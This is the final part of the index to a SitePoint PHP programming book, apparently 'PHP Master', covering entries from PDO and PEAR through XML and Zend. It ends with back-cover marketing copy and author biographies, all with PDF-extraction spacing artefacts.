retrieving data, 46–47
sorting data, 46
storing procedures, 59
transactions, 57–59
using prepared statements, 47–49
PDO::FETCH_ASSOC, 47
PDO::FETCH_BOTH, 47
PDO::FETCH_CLASS, 47
PDO::FETCH_NUM, 47
PDO::query() method, 46, 47
PDOException, 45
PDOStatement, 138
PEAR
about, 317
channel servers, 320–324, 336–340
compiling extensions, 326–329
creating packages, 329–334
installing extensions, 324–325
installing packages, 317–320
naming conventions, 244, 247, 324
other features, 340–341
package versioning, 334–336
PECL and, 317
PHP Code Sniffer ,290
phpDocumentor ,296
using PEAR code, 324
pear command, 317
pear package command, 333PEAR_PackageFileManager2, 329
PECL (PHP Extension Community Lib-
rary)
APC extension, 212, 238–239
compiling extensions, 326–329
installing extensions, 324–325
PEAR and, 317
pecl_http extension, 86–87
XHProf extension (seeXHProf )
pecl command, 317, 325
pecl_http extension, 86–87
performance optimization
APC caching, 218
fordatabases, 216–217
disk caching, 218
memcached, 218–226
opcode caching, 210–215
session data caching, 215–216
performance testing, 203–210
Perl-Compatible Regular Expression
(PCRE) extension, 176
Phing, 314–315
PHP 4,vsPHP5, 3, 22
PHP Code Sniffer
installing, 290
running, 290–292
standards available, 293–294
viewing violations, 293
PHP Extension andApplication Reposit-
ory(PEAR) (seePEAR )
PHP Extension Community Library (PE-
CL)(seePECL (PHP Extension
Community Library) )
PHP lifecycle, 211–212
PHP streams, 87–88, 118369
www.it-ebooks.info
php.ini file
automatically including code, 228, 
278
configuring session options, 185
enabling APC extension, 212
enabling streams, 87
enabling XHProf, 228, 229
memcache setting, 216
PHP4, vsPHP5, 7, 289
PHP_EOL, 139
phpcpd (PHP Copy Paste detector), 287–
288
PHPDeveloper ,353
phpDocumentor ,296–298
phploc (PHP Lines ofCode), 286–287
phpmd (PHP Project Mess Detector),
288–289
PHPSESSID parameter ,185
PHPUnit
about, 244
configuring, 247–248
connecting todatabase, 265–266
creating data sets, 266–269
CSS expressions, 262
installing, 244
output file,248
running testcases, 246–249
Selenium extension (seeSelenium )
testdoubles, 250–253
writing database testcases, 264–265, 
269–270
writing testable code, 253–258
writing unit testcases, 244–246
XPath expressions, 262
phpunit.xml file,247
Pirum, 336–340
pirum.xml file,337placeholders, 48–49, 160
Planet PHP,353
polymorphism, 14–15, 25
POST requests, 94, 106, 121–122, 182
$_POST variable, 90, 181
prepare() method, 48, 54–55, 191
prepared statements, 47, 190–191
primary keys, 42, 60
print_r(), 100, 103
private keyword, 19, 128, 250, 253
procedures, storing, 59
profiling, 226–227
(seealso XHProf )
progressive enhancement, 109
properties
about, 2
incloned objects, 17
non-existent, 22–23
static, 6–7
protected keyword, 19
proxy pattern, 142
public keyword, 18
PUT requests, 122–123
Q
qvalue, inheaders, 93
queries (seeMySQL )
question mark (?),48
queues, 350–352
R
rainbow tables, 193
rand() function, 30
readEvents() function, 119
reCAPTCHA, 197
recursion, 142–144370
www.it-ebooks.info
RecursiveArrayIterator class, 143
RecursiveDirectoryIterator class, 345
RecursiveIterator class, 143
RecursiveIteratorIterator class, 139, 143, 
147–149, 345
redeclaring, 13
references, 15–16
RegexIterator class, 139, 146–147
registry pattern, 131–136
regular expressions, 139, 146–147, 176
relational databases
aggregate functions, 68–69
foreign keys, 62–63
grouping data, 69
indexing, 60, 61–62
inner joins, 65–66
many-to-many relationships, 63–65
normalizing data, 70–72
one-to-many relationships, 42, 60, 62
optimizing performance, 216–217
outer joins, 67–68
primary keys, 60
Release Candidate, 335
Remote Procedure Call (RPC) services
(seeRPC services )
remote-info command, 322
remotes, 309–310
repositories
about, 300
cloning, 306, 308–309
designing, 303–306
distributed, 306–308
working copies, 300
Request object, 117
$_REQUEST variable, 181
REQUEST_FILENAME variable, 160requests
HTTP (seeHTTP requests )
PHP,211–212
require, 4
reset() method, 140
resources, REST ,115, 116
REST
about, 95, 114–115
collecting data, 117–118
creating data, 121–122
deleting data, 124
getting events, 120–121
limitations of,123
MVC and, 118
principles of,116
resources, 115, 116
rewriting requests, 116–117
routing requests, 118–119
storing data, 119–120
updating data, 122–123
URL usage, 115
rewind() method, 140
RewriteCond, 160
RIGHT JOIN statement, 67–68
rollback, 312
rollback() method, 57
rowCount() method, 52–53
RPC services
about, 95, 101
building, 104–106
consuming, 101–103
runGiven() method, 256–258
runThen() method, 256–258
runWhen() method, 256–258
S
salting, 193–194371
www.it-ebooks.info
Same Origin Policy ,106, 111
sanitization, 175
scalar values, 252
Schlitt, Tobias, 274
scope resolution operator (::),6
$screenshotPath, 277
screenshots, asdebug tool, 277–278
secure socket layers (SSL), 199
security
forAPIs, 105
attack vectors (seeattack vectors )
escaping output, 178–179
filtering input, 174–176
GET issues, 182
Same Origin Policy ,106, 111
ofuser data, 174–176
wireless network issues, 198
SELECT statement, 46, 61
Selenium
about, 270
assertions, 274–275
automating testwriting, 279
commands, 272–273
database integration, 275–277
debugging tools, 277–278
locators, 273–274
setup, 271–272
Selenium IDE, 279
semicolon (;),59, 93
serializing, 35–37
$_SER VER variable, 90, 91
$_SER VER['HTTP_HOST'] variable, 174
$_SER VER['PHP_SELF'] variable, 179
$_SER VER['REQUEST_URI'] variable,
160
service-oriented architecture (SOA), 74–
75session data, caching, 215–216
session fixation, 184
session hijacking, 186
session prediction, 184
$_SESSION variable, 181
session.cookie_httponly ,187
session.name, 185
session.use_cookies, 185
session.use_only_cookies, 185
session.use_trans_sid, 185
session_regenerate_id() function, 186
__set() method, 22–23, 32
set() method, 132
set_error_handler() method, 31
set_exception_handler() method, 31
Set-Cookie header ,84
setHttpT imeout() method, 275
setNotes() function, 333
setPackage() function, 333
setReleaseStability() function, 333
setReleaseV ersion() function, 333
setter methods, 21, 153
setUp() method, 246, 269
SHA-1 algorithm, 194
SHA-256 algorithm, 194
shallow copies, 17
Siege, 281–282
SimpleXML extension, 78–82
simplexml_load_file() function, 81
simplexml_load_string() function, 81
SimpleXMLElement, 79, 103, 138
singleton pattern, 128–130
sizeof() method, 348–349
__sleep(), 36–37
SOA (service-oriented architecture), 74–
75372
www.it-ebooks.info
SOAP
about, 95, 101
debugging options, 97
describing with WSDL, 97–99
implementing inPHP,95–97
SoapClient class, 96, 99
SoapServer class, 96
source control
about, 299
components of,300
fordatabases, 311–313
distributed, 306–308
repository structure, 303–306
resolving conflicts, 301–303
social, 308
using Git,308–310
using Subversion, 301
specifications, BDD, 254–258
SPL (Standard PHP Library)
about, 24, 343
array objects, 343–344, 349–350
autoloading, 344–345
Countable interface, 23–24, 348–349
directory functions, 345–347
filefunctions, 345–347
heaps, 351–352
lists, 350
queues, 350–352
stacks, 344, 350–351
utility functions, 352
spl_object_hash(), 352
SplDoublyLinkedList, 350
SplFileInfo class, 345
SplFileObject, 347
SplFixedArray ,349–350
SplHeap class, 351
SplPriorityQueue class, 351–352SplQueue class, 350–351
SplStack class, 350–351
SplT empFileObject, 347
sprintf(), 171
SQL Injection, 189
SQLST ATEcodes, 56
SSL (secure socket layers), 199
stability markers, 318, 335
Stack Overflow forum, 356
stacks, 344, 350–351
Standard PHP Library (SPL) (seeSPL
(Standard PHP Library) )
statelessness, 40, 116
static analysis
about, 285–286
with phpcpd, 287–288
with phploc, 286–287
with phpmd, 288–289
static keyword, 6, 250, 253
static methods, 6–7
static properties, 6–7
status codes, 88–90
stress testing, 203–210
stubbing, 251, 253
Subversion
commands, 301
repository design, 303–306
resolving conflicts, 301–303
SUM, 68
superglobals ($_), 90
symlink, 232, 311
systems testing
about, 270
database integration, 275–277
debugging, 277–278
Selenium assertions, 274–275
Selenium commands, 272–273373
www.it-ebooks.info
Selenium locators, 273–274
Selenium setup, 271–272
with automating testwriting, 279
T
T_PAAMA YIM_NEKUDOT AYIM error ,
6
tags, inrepository ,304
tarcommand, 326
tcpdump, 101
TDD (test-driven development), 253
tearDown() method, 246, 269
testcases
BDD specifications, 254–258
fordatabases, 264–265, 269–270, 275–
277
running, 246–249
writing, 244–246
testdoubles, 250–253
test() method, 246
test-driven development (TDD), 253
testing
benchmarking, 203–210
coding considerations, 253–258
databases (seedatabase testing )
load (seeload testing )
singleton problems, 130
systems (seesystems testing )
unit (seeunit testing )
textfiles, serialized, 119
$this variable, 3, 6
threads, 204
throw keyword, 28
__toString method, 34–35
trace option, 97
traffic, inspecting, 100–101
trait keyword, 130traits, 130–131
transactions, 57–59
triggers, 150
trunk, inrepository ,303
try-catch blocks, 27, 29
type hinting, 13–14, 30
type:key placeholder ,160
typecasting, 82
U
Unconferences, 354
underscore, double (__), 3
underscore, single (_),324
Unified Modeling Language (UML), 11
unit testing
about, 243–244
functional vs.,260–262
MVC components, 259–263
ofdependent classes, 249–253
running testcases, 246–249
writing testcases, 244–246
writing testable code, 253–258
unset() method, 132
UPDA TEstatement, 53
URL collections, 115
url_rewriter .tags, 185
URLs
inREST ,115
rewriting, 159–160, 185
usekeyword, 130
useoperator ,10
user authentication, 183, 186
user groups, 355
User-Agent header ,83, 188374
www.it-ebooks.info
V
valid() method, 140, 144
validation, 175
var_dump() method, 4
variables, naming, 289
version control
forcode (seesource control )
forPEAR packages, 334–336
views, 171, 259–263
Virtual conferences, 354
visibility
choosing, 20–21
level of,18–20
using __get/__set, 22–23
using getter/setter ,21
W
waitFor*() method, 275
waitForNot*() method, 275
__wakeup(), 36–37
WebService Description Language
(WSDL), 95, 97–99
web services, 73
(seealso APIs (Application Program-
ming Interfaces) )
Westhoff, Jakob, 274
WHERE command, 48
wireless networks, 198
Wireshark, 100
working copy ,300
writeEvents() function, 119
WSDL (WebService Description Lan-
guage), 95, 97–99
X
Xdebug, 227, 249, 327XHGui
comparing testruns, 239–241
enabling APC cache, 238–239
installing interface, 232–234
results page, 236–238
setting aprofile, 234–236
XHProf
about, 227
callstack, 231, 232
comparing testruns, 239–241
enabling APC cache, 238–239
installing, 227–230
installing XHGui interface, 232–234
running, 230–232
setting XHGui profile, 234–236
user interface, 230
XHGui results page, 236–238
XML
asAPIdata format, 78–82, 138
creating data setswith, 266
datasets, 266
loading toastack, 350
locating elements, 273–274
Phing config file,314–315
YAML, 266
XPath expressions, 262, 273, 274
XSS (cross-site scripting), 176
Y
YAML, 266
Z
zend_extensions, 329375
www.it-ebooks.info
SITEPOINT BOOKS
     Advocate best practice  techniques
     Lead you through practica l examples
     Prov ide working code for y our websit e
     Make learning easy and fun
Visit us on the Web at sitepoint.com or for sales and support email books@sitepoint.comUS $39.95WEB DEVEL OPMENT
CAN $39.95ISBN EB OOK:978-0-9871530-4-3ALL SOURCE CODE AVAILABLE FOR DOWNL OAD
SHARP, SURE -FIRE T ECHNIQUES 
GUARANTEED  TO TAKE YOUR PHP 
SKILLS  TO THE  NEXT LE VEL
ISBN PRINT :978-0-9870908-7-4Lorna Jane Mitchell is a PHP 
consult ant base d in Leeds, 
UK with a M asters in 
Electronic Engineering. She 
organizes the PHP  North 
West Conference and use r 
group, and has w ritten for .net 
magaz ine and php| archit ect, 
Lorna blogging re gularly  on 
her own site, lornaj ane.net.THE A UTHORS
lornajane.net
LORNA
MITCHELL
DAVEY
SHAFIKwith PHP  and t he LAM P stack , 
as well as HTM L, CSS, and 
JavaScript for over a de cade . 
With several book s, article s, 
and confe rence appe arance s 
unde r his be lt, he  enjoys 
teaching ot hers any  way he 
can. An av id photographe r, he 
lives in sunny  Florida with his 
wife and six  cats.
matthewturland.com
MATTHEW
TURLANDMatthew Turland has been 
using PHP since  2002. S ince 
that time, he ’s be come a 
both PHP  5 and Zen d 
Framework , publishe d articles 
in php| archit ect magaz ine, 
and cont ribute d to book s on 
PHP. He’s also been a 
speaker at php|tek, Confoo, 
and ZendC on.PHP Master: Write Cutting-edge Code is tailor-made for P HP 
applications. This book will help you to employ the most effective  
object oriented programming a pproaches, wrap y our projects in  
layers of security, and ensure your code is doing its job p erfectly. 
You’ll learn how to: 
 Create profe ssional , dynami c application s based on an object oriented 
programming blueprint 
  cy
 Utilize modern testing methods to keep your applications watertight
 Protect your code against attacks with the latest security systems
 Plug in serious functionality with PHP’s APIs and libraries 
And much more …Use objected oriented programming 
blueprints to organize your code Test and evaluate your PHP for 
maximum performanceProtect your apps with advanced 
security techniques
Advanced P erformance Testing
 Powerful OOP Blueprints
 Watertigh t Secu rity Tactics 
phpguru1x7x9-mock.indd   1www.it-ebooks.info
